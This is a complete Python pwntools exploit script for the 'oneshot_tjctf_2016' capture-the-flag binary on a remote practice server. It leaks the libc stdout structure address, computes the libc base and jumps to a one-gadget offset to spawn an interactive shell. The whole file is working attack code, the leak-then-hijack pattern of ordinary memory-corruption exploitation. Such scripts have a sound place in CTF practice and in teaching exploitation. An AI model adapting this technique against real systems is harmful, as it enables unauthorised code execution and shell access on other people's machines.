from pwn import *


# p = process("./oneshot_tjctf_2016")
p = remote("node4.buuoj.cn", 29538)
pro = ELF("./oneshot_tjctf_2016")


# you can also use got to leak libc
# puts_g = pro.got["puts"]
stdout = 0x0600B20

# leak
p.sendlineafter("Read location?\n", str(stdout))
p.recvuntil("Value: ")
info = int(p.recvuntil("\n", drop=True), 16)
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.23-64.so")
base = info-libc.sym["_IO_2_1_stdout_"]
print("base: ", hex(base))
oneshot = base+0x45216

# attack
p.sendlineafter("Jump location?\n", str(oneshot))

p.interactive()


